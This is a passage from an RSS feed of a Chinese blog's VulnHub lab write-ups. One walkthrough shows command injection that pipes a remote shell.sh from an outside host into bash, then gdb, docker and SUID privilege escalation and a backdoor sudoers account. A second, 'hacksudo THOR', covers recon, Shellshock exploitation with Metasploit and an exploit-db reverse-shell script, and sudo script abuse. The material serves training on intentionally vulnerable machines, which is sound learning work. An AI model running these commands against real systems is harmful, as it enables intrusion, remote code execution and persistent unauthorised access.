bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;-&amp;gt; 即在 url 地址上构造：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWNvbnRlbnQvdXBsb2Fkcy9hcnRpY3VsYXRlX3VwbG9hZHMvcG9jOS9pbmRleC5waHA/WF9UPWN1cmwlMjBodHRwOi8vd3d3LmNoZW50dW8uYXNpYS9zaGVsbC5zaCUyMCU3QyUyMGJhc2g=&#34;&gt;http://192.168.31.230/wp-content/uploads/articulate_uploads/poc9/index.php?X_T=curl http://www.chentuo.asia/shell.sh | bash&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-121.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-122.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;标准shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27; then press Ctrl+Z&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg then press ENTER twice&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd / &amp;amp;&amp;amp; id&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;suid-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-提权&#34;&gt;#&lt;/a&gt; SUID 提权&lt;/h3&gt;
&lt;p&gt;尝试 suid 提权&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;发现系统上运行所有suid可执行文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -perm -u=s -type f 2 &amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-perm表示搜索后面的权限 - u=s表示查找 root 用户拥有的文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-&lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt;表示我们正在寻找的文件类型 f 表示普通文件，而不是目录或特殊文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;2 表示到进程的第二个文件描述符，即 stderr（标准错误）&amp;gt;表示重定向&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/dev/null是一个特殊的文件系统对象，它会丢弃写入其中的所有内容。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-123.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
未找到 nmap vim find bash more less nano cp 含有s权限
&lt;h3 id=&#34;sudogdb-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudogdb-提权&#34;&gt;#&lt;/a&gt; sudo (gdb) 提权&lt;/h3&gt;
&lt;p&gt;提权教程：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZ2RiLw==&#34;&gt;https://gtfobins.github.io/gtfobins/gdb/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;由于gdb只是针对用户offensivehack来言是无密码的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;所以这里需要通过-u来指定用户名，使用该用户来通过gdb反弹shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u offensivehack gdb -nx -ex &amp;#x27;!sh&amp;#x27; -ex quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-l, list user\&lt;span class=&#34;string&#34;&gt;&amp;#x27;s privileges or check a specific command; use twice for longer format&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;string&#34;&gt;-u, run command (or edit file) as specified user name or ID&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;string&#34;&gt;通过python3 来将当前的终端转化为一个标准的shell：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-124.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;iddocker-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#iddocker-提权&#34;&gt;#&lt;/a&gt; id (docker) 提权&lt;/h3&gt;
&lt;p&gt;注意到输入 id 的时候有补充组 docker，可采用 docker 提权&lt;br&gt;
 Docker 提权说明：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZG9ja2VyLw==&#34;&gt;https://gtfobins.github.io/gtfobins/docker/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;docker 提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker run -v /:/mnt --rm -it alpine chroot /mnt sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;标准shell：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-125.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;篡改-sudoers-维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#篡改-sudoers-维权&#34;&gt;#&lt;/a&gt; 篡改 sudoers 维权&lt;/h3&gt;
&lt;p&gt;由当前 root 权限的机器继续执行操作&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置密码为kali&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;useradd kali &amp;amp;&amp;amp; passwd kali&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;添加sudoers文件写权限:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod u+w /etc/sudoers&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim /etc/sudoers&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;root ALL=(ALL) ALL 这一行，在其下面追加：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kali ALL=(ALL) ALL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;撤销sudoers文件权限:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod u-w /etc/sudoers&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-126.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;攻击机：ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmthbGlAMTkyLjE2OC4zMS4yMzA=&#34;&gt;kali@192.168.31.230&lt;/span&gt; &amp;amp;&amp;amp; sudo cat /root/flag.txt&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-127.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 可登陆 kali，用 sudo 进行 root 权限的操作&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/119%20THOR/</guid>
            <title>VULNHUB 19 THOR</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/119%20THOR/</link>
            <category>VULNHUB 11-20</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tdGhvciw3MzMv&#34;&gt;https://www.vulnhub.com/entry/hacksudo-thor,733/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU4MDE0NTIuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15801452.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 THOR：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-423.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看靶机所在 win 主机的 ip 地址&lt;br&gt;
 &lt;code&gt;ipconfig | find “192.168.31”&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-424.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;与主机同一 MAC 地址的 ip 地址即为靶机 IP&lt;/p&gt;
&lt;p&gt;也可以登陆路由器后台，查看 win 主机上的信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-425.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;显示有 win 上所有存在过的 ip 地址，以及其 MAC 地址&lt;br&gt;
 -&amp;gt; 靶机 ip：192.168.31.115&lt;/p&gt;
&lt;p&gt;2）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.115&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-426.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21,22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE1&#34;&gt;http://192.168.31.115&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-427.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;先对目标网站进行目录扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.115/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-428.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE1L1JFQURNRS5tZA==&#34;&gt;http://192.168.31.115/README.md&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-429.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 管理员的用户名是 “admin”，密码是 “password123”。&lt;/p&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE1L2luZGV4LnBocA==&#34;&gt;http://192.168.31.115/index.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-430.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 输入用户名和密码之后，显示登录失败，可能此密码在其他地方才能登陆&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-431.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE1L2FkbWluX2xvZ2luLnBocA==&#34;&gt;http://192.168.31.115/admin_login.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-432.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功登陆到对方网站的后台&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-433.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sql-注入测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-注入测试&#34;&gt;#&lt;/a&gt; SQL 注入测试&lt;/h3&gt;
&lt;p&gt;翻了翻目录没有什么新的发现&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-434.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试对登陆的地方进行注入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-435.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对登陆的地方进行 burp 抓取数据包&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-436.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;复制数据包，用 sqlmap 测试发现没有注入点&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-437.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;cgi-bin-漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cgi-bin-漏洞&#34;&gt;#&lt;/a&gt; cgi-bin 漏洞&lt;/h3&gt;
&lt;p&gt;扩大信息收集面，用 dirb 收集更多的目录结构&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-438.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对收集到的 cgi-bin 目录进行更深一级的搜寻&lt;br&gt;
 &lt;code&gt;dirsearch -u http://192.168.31.115/cgi-bin/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-439.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 敏感目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE1L2NnaS1iaW4vc2hlbGwuc2g=&#34;&gt;http://192.168.31.115/cgi-bin/shell.sh&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-440.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接上谷歌搜索 cgi-bin 的漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-441.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了测试 shellshock 的的命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-442.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh 192.168.31.115&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-443.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 确定了此端口存在 CVE-2014-6271 这个漏洞&lt;/p&gt;
&lt;h3 id=&#34;msf-攻击-shellshock&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf-攻击-shellshock&#34;&gt;#&lt;/a&gt; msf 攻击 shellshock&lt;/h3&gt;
&lt;p&gt;利用 msf 寻找此漏洞进行利用&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-444.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;search CVE-2014-6271&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/http/apache_mod_cgi_bash_env_exec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.31.115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /cgi-bin/shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-445.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到网站反弹的 shell&lt;/p&gt;
&lt;h3 id=&#34;searchsploit攻击shellshock&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#searchsploit攻击shellshock&#34;&gt;#&lt;/a&gt; searchsploit 攻击 shellshock&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;searchsploit shellshock&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-446.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;searchsploit -x linux/remote/34900.py&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-447.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;cp /usr/share/exploitdb/exploits/linux/remote/34900.py .&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;python 34900.py&lt;/code&gt; &lt;br&gt;
 查看此 exp 是如何利用的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-448.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;根据提示，写全命令行进行攻击&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./34900.py payload=reverse rhost=192.168.31.115 lhost=192.168.31.135 lport=5555 pages=/cgi-bin/shell.sh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-449.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到反弹后的 shell&lt;/p&gt;
&lt;h3 id=&#34;pspy64s-监控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pspy64s-监控&#34;&gt;#&lt;/a&gt; pspy64s 监控&lt;/h3&gt;
&lt;p&gt;翻阅目录，查找到一个备份文件，猜测此备份由高权限执行，直接上 pspy 进行监控&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-450.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 pspy 从 kali 机器上下载下来，赋予 x 权限，然后执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-451.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;等待监控是否执行了一些特殊命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-452.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 遗憾的是并没有执行什么特殊任务，不能进行提权&lt;/p&gt;
&lt;h3 id=&#34;service-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#service-提权&#34;&gt;#&lt;/a&gt; service 提权&lt;/h3&gt;
&lt;p&gt;收集服务器的相关信息，sudo -l 确定了可以调用 thor 去执行一个脚本&lt;br&gt;
 &lt;code&gt;sudo -u thor /home/thor/./hamer.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;输入 bash 后反弹出来了一个 thor 用户的 shell&lt;br&gt;
 &lt;code&gt;python3 -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-453.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
